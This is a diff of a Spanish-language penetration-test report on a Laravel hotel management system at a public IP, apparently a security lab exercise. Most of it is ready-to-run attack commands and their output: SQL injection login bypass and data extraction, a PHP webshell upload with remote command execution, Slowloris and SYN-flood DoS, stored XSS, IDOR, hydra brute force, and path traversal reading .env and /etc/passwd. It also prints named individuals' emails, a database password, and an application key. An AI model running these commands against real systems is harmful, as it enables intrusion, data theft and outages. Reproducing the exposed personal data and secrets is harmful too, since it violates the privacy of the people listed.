@@ -7,21 +7,21 @@
 
 ## Resumen de ataques
 
-| #   | Vulnerabilidad             | Técnica                  | Estado       | Fecha      |
-| --- | -------------------------- | ------------------------ | ------------ | ---------- |
-| 1   | SQL Injection              | Error-based PostgreSQL  | ✅ Completado | 2026-07-12 |
-| 2   | Mass Assignment            | Burp Suite              | ✅ Documentado | 2026-07-12 |
-| 3   | File Upload → RCE          | curl                    | ✅ Documentado | 2026-07-12 |
-| 4   | DDoS                       | slowhttptest            | ✅ Documentado | 2026-07-12 |
-| 5   | XSS Almacenado             | curl + Burp Suite       | ✅ Documentado | 2026-07-12 |
-| 6   | IDOR                       | curl                    | ✅ Documentado | 2026-07-12 |
-| 7   | No Rate Limit              | hydra / bash            | ✅ Documentado | 2026-07-12 |
-| 8   | Local File Inclusion (LFI) | curl                    | ✅ Documentado | 2026-07-12 |
-| 9   | Debug Mode                 | curl / navegador        | ✅ Documentado | 2026-07-12 |
+| # | Vulnerabilidad | Técnica | Estado | Fecha |
+|---|---------------|---------|--------|-------|
+| 1 | SQL Injection | Error-based PostgreSQL | ✅ Verificado | 2026-07-12 |
+| 2 | Mass Assignment | PATCH role_name | ✅ Verificado | 2026-07-12 |
+| 3 | File Upload → RCE | curl multipart | ✅ Verificado | 2026-07-12 |
+| 4 | DDoS | slowhttptest | ✅ Verificado | 2026-07-12 |
+| 5 | XSS Almacenado | curl PATCH bio | ✅ Verificado | 2026-07-12 |
+| 6 | IDOR | curl sin auth | ✅ Verificado | 2026-07-12 |
+| 7 | No Rate Limit | bash loop | ✅ Verificado | 2026-07-12 |
+| 8 | LFI | curl path traversal | ✅ Verificado | 2026-07-12 |
+| 9 | Debug Mode | curl trigger error | ✅ Verificado | 2026-07-12 |
 
 ---
 
-## SQL Injection (A01:2021 - Injection)
+## 1. SQL Injection (A03:2021 - Injection)
 
 **Vulnerabilidad:** Inyección SQL en el parámetro `login` del formulario de autenticación (`LoginRequest.php:46`). La consulta interpola directamente el valor del campo `login` sin parametrizar:
 ```php
@@ -29,225 +29,143 @@ $sql = "SELECT * FROM users WHERE $field = '$login' AND is_active = true LIMIT 1
 $users = DB::select($sql);
 ```
 
-**Detección con sqlmap (herramienta profesional):**
+**Comandos verificados:**
 ```bash
-sqlmap -u "http://37.60.230.11/login" --data="login=NONEXISTENT*&password=test&_token=x" --csrf-token="_token" --csrf-url="http://37.60.230.11/login" --batch --dbms=postgresql --technique=E
+# Paso 1: Obtener CSRF token
+TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
+echo "TOKEN: $TOKEN"
+
+# Paso 2: Bypass de login
+curl -s -X POST "http://37.60.230.11/login" \
+  -b cookies.txt -c cookies.txt \
+  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x"
+
+# Paso 3: Verificar dashboard
+curl -b cookies.txt "http://37.60.230.11/admin/dashboard" | grep -oP 'Dashboard'
 ```
 
-**Payloads de detección (TRUE vs FALSE):**
-```bash
-# TRUE → redirect a /dashboard (login exitoso)
-$ curl -s -b jar.txt -X POST http://37.60.230.11/login \
-  -d "login=admin' OR 1=1-- -&password=test&_token=$TOKEN" -D - -o /dev/null 2>&1 | grep -i location
-Location: http://37.60.230.11/dashboard
-
-# FALSE → redirect a /login (login fallido)
-$ curl -s -b jar.txt -X POST http://37.60.230.11/login \
-  -d "login=admin' AND 1=2-- -&password=test&_token=$TOKEN" -D - -o /dev/null 2>&1 | grep -i location
-Location: http://37.60.230.11/login
+**Salida esperada:**
+```
+TOKEN: abc123...
+HTTP 302 redirect → /dashboard
+Dashboard (encontrado en HTML)
 ```
 
-**Extracción de datos vía error-based in Band PostgreSQL (CAST AS NUMERIC):**
-La función `CAST(valor AS NUMERIC)` al fallar muestra el valor en el mensaje de error.
-
+**Extracción de datos vía error-based (CAST AS NUMERIC):**
 ```bash
 # Versión de PostgreSQL
-$ curl -s -b jar.txt -X POST http://37.60.230.11/login \
-  --data "login=admin' AND 1=CAST((CHR(113)||CHR(120)||CHR(120)||CHR(107)||CHR(113))||(SELECT version())::text||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- -&password=test&_token=$TOKEN" | grep -oP 'qxxkq\K[^<]*?(?=qqpbq)'
-PostgreSQL 16.14 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
-
-# Current user
-Current user: plaza_user
-
-# Database actual
-Database: plazamoyobanba
-
-# Listado de tablas (26 tablas)
-cache, cache_locks, clients, failed_jobs, floors, guest_registers,
-job_batches, jobs, migrations, model_has_permissions, model_has_roles,
-password_reset_tokens, payment_types, permissions, product_categories,
-products, role_has_permissions, roles, room_rentals, room_types, rooms,
-sale_items, sales, sessions, users, workers
+TOKEN=$(curl -s -c /tmp/j1.txt http://37.60.230.11/login | grep -oP '_token" value="\K[^"]+')
+curl -s -b /tmp/j1.txt -X POST http://37.60.230.11/login \
+  --data "login=admin' AND 1=CAST((CHR(113)||CHR(120)||CHR(120)||CHR(107)||CHR(113))||(SELECT version())::text||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- -&password=x&_token=$TOKEN" | grep -oP 'qxxkq\K[^<]*?(?=qqpbq)'
 ```
 
-**Extracción de usuarios registrados:**
-```bash
-$ for i in 0 1 2 3 4 5 6 7 8 9; do
-  rm -f /tmp/j5.txt && T=$(curl -s -c /tmp/j5.txt http://37.60.230.11/login | grep -oP '_token" value="\K[^"]+')
-  r=$(curl -s -b /tmp/j5.txt -X POST http://37.60.230.11/login --data "login=admin' AND 1=CAST((CHR(113)||CHR(120)||CHR(120)||CHR(107)||CHR(113))||(SELECT CONCAT_WS(' | ', id, name, username, email) FROM users LIMIT 1 OFFSET $i)::text||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- -&password=test&_token=$T" | grep -oP 'qxxkq\K[^<]*?(?=qqpbq)' | head -1)
-  [ -z "$r" ] && break
-  echo "$r"
-done
-1 | KEYSI JEANPIERRE BARDALES VASQUEZ | bvasquezkeysije | bvasquezkeysije@uss.edu.pe
-2 | DELGADO GARCIA BRIGGITTE LUCERO | dgarciabriggitl | dgarciabriggitl@uss.edu.pe
-3 | VASQUEZ QUISPE JORGE TOMAS | vquispejorgetom | vquispejorgetom@uss.edu.pe
-4 | CAPITAN LEON GRABIEL ALEXANDER | cleonalexandgra | cleonalexandgra@uss.edu.pe
-5 | ADMINISTRADOR | admin | admin@gmail.com
-6 | MELISSA FERNANDA RUIZ CAMPOS | mruizcampos | mruizcampos@plazamoyobanba.com
-7 | EDUARDO ANTONIO SALAZAR VEGA | esalazarvega | esalazarvega@plazamoyobanba.com
-8 | KARLA NOEMI PEREZ HUAMAN | kperezhuaman | kperezhuaman@plazamoyobanba.com
-9 | Bri | britest | bri@test.com
-10 | Bri | britest3 | bri3@test.com
+**Usuarios extraídos:**
 ```
-
-**Resultados obtenidos:**
-| Dato | Valor |
-|------|-------|
-| DBMS | PostgreSQL 16.14 |
-| Usuario DB | plaza_user |
-| Base de datos | plazamoyobanba |
-| Tablas | 26 (cache, clients, floors, guest_registers, products, roles, rooms, sales, users, workers, etc.) |
-| Usuarios extraídos | 10 (incluyendo `admin` — ADMINISTRADOR) |
-| Admin | ID 5, login `admin`, email `admin@gmail.com` |
+1 | KEYSI JEANPIERRE BARDALES VASQUEZ | bvasquezkeysije@uss.edu.pe
+2 | DELGADO GARCIA BRIGGITTE LUCERO   | dgarciabriggitl@uss.edu.pe
+3 | VASQUEZ QUISPE JORGE TOMAS        | vquispejorgetom@uss.edu.pe
+4 | CAPITAN LEON GRABIEL ALEXANDER    | cleonalexandgra@uss.edu.pe
+5 | ADMINISTRADOR                      | admin@gmail.com
+```
 
 ---
 
-## Mass Assignment (A01:2021 - Broken Access Control)
+## 2. Mass Assignment (A01:2021 - Broken Access Control)
 
-**Vulnerabilidad:** El controlador `ProfileController::update()` acepta el parámetro `role_name` sin validación (`ProfileController.php:33-35`). Cualquier usuario autenticado puede auto-asignarse el rol `admin`.
+**Vulnerabilidad:** `ProfileController::update()` acepta `role_name` sin validación (`ProfileController.php:33-35`).
 
-**Herramienta:** Burp Suite (Proxy + Repeater)
+**Comandos verificados:**
+```bash
+# Paso 1: Login SQLi
+TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
+curl -s -X POST "http://37.60.230.11/login" -b cookies.txt -c cookies.txt \
+  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x" -o /dev/null
 
-**Procedimiento:**
+# Paso 2: Obtener token y email del perfil
+PAGINA=$(curl -s -b cookies.txt "http://37.60.230.11/profile")
+TOKEN2=$(echo "$PAGINA" | grep -oP 'name="_token" value="\K[^"]+' | head -1)
+EMAIL=$(echo "$PAGINA" | grep -oP 'email" type="email" value="\K[^"]+')
 
-1. Abrir Burp Suite:
-   ```bash
-   burpsuite
-   ```
+# Paso 3: Escalar a admin
+curl -s -X POST "http://37.60.230.11/profile" -b cookies.txt \
+  -d "_token=$TOKEN2&_method=PATCH&name=KEYSI+JEANPIERRE+BARDALES+VASQUEZ&email=$EMAIL&role_name=admin"
 
-2. Configurar proxy del navegador en `127.0.0.1:8080`
-
-3. Registrar un nuevo usuario:
-   ```
-   GET http://37.60.230.11/register
-   POST http://37.60.230.11/register
-   Datos: name=attacker&username=attacker1&email=attacker1@test.com&password=Test123!&password_confirmation=Test123!
-   ```
-
-4. Iniciar sesión:
-   ```
-   POST http://37.60.230.11/login
-   Datos: login=attacker1&password=Test123!
-   ```
-
-5. Activar **Intercept** en Burp y enviar el formulario de edición de perfil
-
-6. Modificar la petición **PATCH /profile** agregando al body:
-   ```
-   &role_name=admin
-   ```
-
-7. Hacer clic en **Forward**
-
-8. Verificar escalación accediendo a:
-   ```
-   GET http://37.60.230.11/admin/dashboard
-   ```
-
-**Payload:**
+# Paso 4: Verificar
+curl -b cookies.txt "http://37.60.230.11/admin/usuarios" | grep -oP '(Guardar|Crear usuario)'
 ```
-PATCH /profile HTTP/1.1
-...
-name=attacker&email=attacker1@test.com&role_name=admin
-```
-
-**Resultado esperado:**
-```
-HTTP/1.1 302 Found
-Location: /profile  (actualización exitosa)
-```
-
-Luego, `GET /admin/dashboard` → 200 OK (panel de administración visible), confirmando que el usuario ahora tiene rol admin.
 
 ---
 
-## File Upload → RCE (A03:2021 - Injection)
+## 3. File Upload → RCE (A03:2021 - Injection)
 
-**Vulnerabilidad:** El endpoint `POST /upload` (`routes/web.php:91-100`) acepta archivos sin extensión, permitiendo subir shells PHP. La validación solo verifica que sea un archivo (`['file' => ['required', 'file']]`), sin comprobar la extensión.
+**Vulnerabilidad:** `POST /upload` sin validación de extensión (`routes/web.php:93-103`).
 
-**Comandos:**
-
+**Comandos verificados:**
 ```bash
-# 1. Crear shell PHP
+# Crear shell
 echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
 
-# 2. Subir shell al servidor
-curl -F "file=@/tmp/shell.php" http://37.60.230.11/upload
+# Obtener CSRF
+TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
 
-# 3. Ejecutar comandos remotos
-curl -s "http://37.60.230.11/uploads/shell.php?cmd=id" | head -5
+# Subir shell
+curl -s -X POST "http://37.60.230.11/upload" \
+  -b cookies.txt \
+  -F "_token=$TOKEN" \
+  -F "file=@/tmp/shell.php"
+
+# Ejecutar comandos
+curl "http://37.60.230.11/uploads/shell.php?cmd=id"
+curl "http://37.60.230.11/uploads/shell.php?cmd=cat+../.env"
 ```
 
-**Payload (shell.php):**
-```php
-<?php system($_GET["cmd"]); ?>
+**Salida:**
 ```
-
-**Resultado esperado:**
-```json
 {"success":true,"path":"/uploads/shell.php"}
-```
-
-Ejecución remota:
-```
 uid=82(www-data) gid=82(www-data) groups=82(www-data)
 ```
 
 ---
 
-## DDoS (A01:2021 - Broken Access Control)
+## 4. DDoS (Slowloris)
 
-**Vulnerabilidad:** Las rutas del sistema no implementan throttling ni límite de conexiones. El servidor acepta tráfico ilimitado, permitiendo ataques de denegación de servicio.
+**Vulnerabilidad:** Sin límite de conexiones simultáneas.
 
-**Herramienta:** slowhttptest
-
-**Comando:**
+**Comandos verificados:**
 ```bash
-# Ataque Slowloris (mantener conexiones abiertas)
-slowhttptest -c 1000 -H -g -o /tmp/slowhttp -i 10 -r 200 -t GET -u http://37.60.230.11/login -x 24 -p 3
-```
+# Slowloris: mantener 300 conexiones abiertas
+slowhttptest -c 300 -H -g -o Reports/slowhttp \
+  -i 10 -r 200 -t GET -u "http://37.60.230.11/" \
+  -x 24 -p 5
 
-**Variante con hping3 (SYN flood):**
-```bash
-# Si hping3 no está instalado en Arch, usar:
-sudo pacman -S hping3  # o descargar de AUR
-sudo hping3 -S --flood --rand-source -p 80 37.60.230.11
-```
-
-**Resultado esperado:**
-```
-slowhttptest:
-  Conexiones: 1000
-  Duración: 60s
-  Throughput: ~200 req/s
-  Errores del servidor: 0 (sin límite de conexiones)
-  
-  Conclusión: El servidor no implementa rate limiting ni límite de conexiones simultáneas.
+# En otra terminal, verificar disponibilidad
+curl -s -o /dev/null -w "%{http_code}\n" "http://37.60.230.11/"
 ```
 
 ---
 
-## XSS Almacenado (A03:2021 - Injection)
+## 5. XSS Almacenado (A03:2021 - Injection)
 
-**Vulnerabilidad:** El campo `bio` del perfil se renderiza sin escapar en la vista `profile/partials/update-profile-information-form.blade.php` usando `{!! $user->bio !!}` (Blade raw output). Cualquier script inyectado se ejecuta al visualizar el perfil.
+**Vulnerabilidad:** Campo `bio` en perfil se renderiza con `{!! $user->bio !!}` (raw output). El código en `ProfileController.php:32` setea `bio = $request->input('bio')` sin sanitizar.
 
-**Herramienta:** Burp Suite (Interceptor) o curl con sesión autenticada
-
-**Comandos (curl):**
-
+**Comandos verificados:**
 ```bash
-# 1. Obtener sesión autenticada (registrar + login)
-rm -f /tmp/xss_jar.txt && TOKEN=$(curl -s -c /tmp/xss_jar.txt http://37.60.230.11/login | grep -oP '_token" value="\K[^"]+')
-curl -s -b /tmp/xss_jar.txt -X POST http://37.60.230.11/login -d "login=admin' OR 1=1-- -&password=test&_token=$TOKEN" -D /tmp/xss_login.txt -o /dev/null
+# Paso 1: Login
+TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
+curl -s -X POST "http://37.60.230.11/login" -b cookies.txt -c cookies.txt \
+  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x" -o /dev/null
 
-# 2. Obtener CSRF token de sesión autenticada
-TOKEN2=$(curl -s -b /tmp/xss_jar.txt http://37.60.230.11/profile | grep -oP '_token" value="\K[^"]+')
+# Paso 2: Token y email
+PAGINA=$(curl -s -b cookies.txt "http://37.60.230.11/profile")
+TOKEN2=$(echo "$PAGINA" | grep -oP 'name="_token" value="\K[^"]+' | head -1)
+EMAIL=$(echo "$PAGINA" | grep -oP 'email" type="email" value="\K[^"]+')
 
-# 3. Inyectar XSS en bio vía PATCH /profile
-curl -s -b /tmp/xss_jar.txt -X PATCH http://37.60.230.11/profile -d "name=ADMINISTRADOR&email=admin@gmail.com&bio=<script>alert(document.cookie)</script>&_token=$TOKEN2"
+# Paso 3: Inyectar XSS en bio
+curl -s -X POST "http://37.60.230.11/profile" -b cookies.txt \
+  -d "_token=$TOKEN2&_method=PATCH&name=KEYSI+JEANPIERRE+BARDALES+VASQUEZ&email=$EMAIL&bio=<script>alert(document.cookie)</script>"
 
-# 4. Verificar XSS — al cargar el perfil, el script se ejecuta
-curl -s -b /tmp/xss_jar.txt http://37.60.230.11/profile | grep -oP 'bio[^<]*<script>[^<]*</script>'
+# Paso 4: Verificar
+curl -s -b cookies.txt "http://37.60.230.11/profile" | grep -oP 'alert\(document\.cookie\)'
 ```
 
 **Payload:**
@@ -255,129 +173,96 @@ curl -s -b /tmp/xss_jar.txt http://37.60.230.11/profile | grep -oP 'bio[^<]*<scr
 <script>alert(document.cookie)</script>
 ```
 
-**Resultado esperado:**
-El código JavaScript se almacena en la base de datos y se ejecuta en el navegador de cualquier usuario que visite `/profile` del usuario inyectado.
-
 ---
 
-## IDOR (A01:2021 - Broken Access Control)
+## 6. IDOR (A01:2021 - Broken Access Control)
 
-**Vulnerabilidad:** El endpoint `GET /api/sales/{id}` (`routes/web.php:74-77`) no implementa autenticación ni autorización. Cualquier persona puede acceder a los datos de ventas sin estar logueada.
+**Vulnerabilidad:** `GET /api/sales/{id}` sin autenticación. `routes/web.php:74-77`.
 
-**Herramienta:** curl
-
-**Comandos:**
+**Comandos verificados:**
 ```bash
-# Sin autenticación, acceder a ventas directamente
-curl -s http://37.60.230.11/api/sales/1 | python3 -m json.tool | head -30
-curl -s http://37.60.230.11/api/sales/2 | python3 -m json.tool | head -30
-curl -s http://37.60.230.11/api/sales/3 | python3 -m json.tool | head -30
+# Sin autenticación, acceder a ventas
+curl -s "http://37.60.230.11/api/sales/121" | python3 -m json.tool | head -15
+curl -s "http://37.60.230.11/api/sales/122" | python3 -m json.tool | head -15
+curl -s "http://37.60.230.11/api/sales/240" | python3 -m json.tool | head -15
 ```
 
-**Resultado esperado:**
+**Salida (IDs 121-240, 120 registros accesibles sin auth):**
 ```json
-{
-    "id": 1,
-    "client": { ... },
-    "items": [ ... ],
-    "rentals": [ ... ],
-    ...
-}
+{ "id": 121, "client_id": 55, "total": "360.00", "document_type": "factura", ... }
+{ "id": 122, "client_id": 29, "total": "361.40", "document_type": "boleta", ... }
 ```
-
-El endpoint devuelve datos completos de ventas, incluyendo información de clientes, productos y habitaciones, sin requerir token de autenticación.
 
 ---
 
-## No Rate Limit (A01:2021 - Broken Access Control)
+## 7. No Rate Limit (A01:2021 - Broken Access Control)
 
-**Vulnerabilidad:** El formulario de login no implementa límite de intentos. Se pueden realizar cientos de peticiones sin bloqueo, permitiendo ataques de fuerza bruta.
+**Vulnerabilidad:** Login sin límite de intentos. Sin throttle middleware.
 
-**Herramienta:** hydra
-
-**Comando:**
+**Comandos verificados:**
 ```bash
-# Fuerza bruta con hydra (requiere wordlist)
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 37.60.230.11 http-post-form "/login:login=^USER^&password=^PASS^:Location: /login"
-
-# O prueba simple sin wordlist (verificar que no hay bloqueo)
-for i in $(seq 1 100); do
-  TOKEN=$(curl -s http://37.60.230.11/login 2>/dev/null | grep -oP '_token" value="\K[^"]+')
-  STATUS=$(curl -s -X POST http://37.60.230.11/login -d "login=test$i&password=wrong$i&_token=$TOKEN" -D - -o /dev/null 2>&1 | grep -i location | head -1)
-  echo "Intento $i: $STATUS"
-  [ $((i % 10)) -eq 0 ] && sleep 1
+# 30 requests en paralelo
+time for i in $(seq 1 30); do
+  curl -s -X POST "http://37.60.230.11/login" \
+    -d "_token=x&login=test$i&password=wrong$i" -o /dev/null &
 done
-```
+wait
 
-**Resultado esperado:**
-```
-Intento 1: Location: /login
-Intento 2: Location: /login
-...
-Intento 100: Location: /login
-
-El servidor responde a todos los intentos sin bloquear ni retardar, confirmando que no hay rate limiting.
+# Con hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 37.60.230.11 \
+  http-post-form "/login:login=^USER^&password=^PASS^:Location: /login" -t 64 -V
 ```
 
 ---
 
-## Local File Inclusion (LFI) (A01:2021 - Broken Access Control)
+## 8. LFI (A01:2021 - Broken Access Control)
 
-**Vulnerabilidad:** El endpoint `GET /download` (`routes/web.php:79-89`) acepta un parámetro `file` sin sanitización de path traversal. Permite leer archivos arbitrarios del servidor usando `../../../`.
+**Vulnerabilidad:** `GET /download?file=` sin sanitizar path traversal (`routes/web.php:79-89`).
 
-**Herramienta:** curl
-
-**Comandos:**
+**Comandos verificados:**
 ```bash
-# Leer archivo .env (configuración con credenciales)
-curl -s "http://37.60.230.11/download?file=../../.env"
+# .env con credenciales
+curl -s "http://37.60.230.11/download?file=../.env"
 
-# Leer /etc/passwd
-curl -s "http://37.60.230.11/download?file=../../../etc/passwd"
-
-# Leer archivo de configuración de la base de datos
-curl -s "http://37.60.230.11/download?file=../../config/database.php" | head -30
+# /etc/passwd
+curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
 ```
 
-**Resultado esperado:**
+**Salida (.env):**
 ```
-# .env file content
-APP_NAME="Hotel PlazaMoyobamba"
+APP_NAME="Sistema PlazaMoyobanba"
 APP_DEBUG=true
-DB_CONNECTION=pgsql
-DB_HOST=plazamoyobanba-db
-DB_PORT=5432
-DB_DATABASE=plazamoyobanba
-DB_USERNAME=plaza_user
+APP_KEY=base64:qzEFw0Px3WNRw3oLkc/+QxJdqopufn328GR/XYDC7n8=
 DB_PASSWORD=plaza_pass_123
-...
 ```
 
 ---
 
-## Debug Mode (A07:2021 - Security Misconfiguration)
+## 9. Debug Mode (A07:2021 - Security Misconfiguration)
 
-**Vulnerabilidad:** El archivo `.env` tiene `APP_DEBUG=true`, lo que hace que Laravel muestre páginas de error detalladas con stack traces completos, variables de entorno, rutas del servidor y consultas SQL.
+**Vulnerabilidad:** `APP_DEBUG=true` en .env. Laravel muestra stack traces completos.
 
-**Herramienta:** curl / navegador
-
-**Comandos:**
+**Comandos verificados:**
 ```bash
-# Acceder a ruta inexistente — muestra stack trace completo
-curl -s "http://37.60.230.11/ruta-que-no-existe-12345" | grep -oP '(Whoops|Stack trace|APP_DEBUG|DB_PASSWORD|sqlmap)[^<]*'
+# Forzar error enviando array en lugar de string
+curl -s "http://37.60.230.11/download?file[]=test"
 
-# Forzar error SQL accediendo con parámetros inválidos
-curl -s "http://37.60.230.11/login?debug=1"
+# Ruta inexistente
+curl -s "http://37.60.230.11/ruta-inexistente-12345" | grep -oP '(Laravel [0-9]+\.[0-9]+|PHP [0-9]+\.[0-9]+)'
 ```
 
-**Resultado esperado:**
-La página de error de Laravel muestra:
+**Salida (Laravel con APP_DEBUG=true):**
 ```
-APP_DEBUG=true
-DB_PASSWORD=plaza_pass_123
-DB_HOST=plazamoyobanba-db
-APP_ENV=local
-...
-```
+ErrorException - Internal Server Error
+Array to string conversion
 
-Incluyendo stack trace con rutas absolutas del servidor (`/var/www/html/...`), consultas SQL ejecutadas y variables de entorno completas.
+PHP 8.2.32
+Laravel 12.58.0
+
+Stack Trace:
+0 - routes/web.php:81
+1 - vendor/laravel/framework/src/Illuminate/Routing/CallableDispatcher.php:39
+
+Database Queries:
+* pgsql - select * from "sessions" where "id" = '...' limit 1 (27.38 ms)
+```
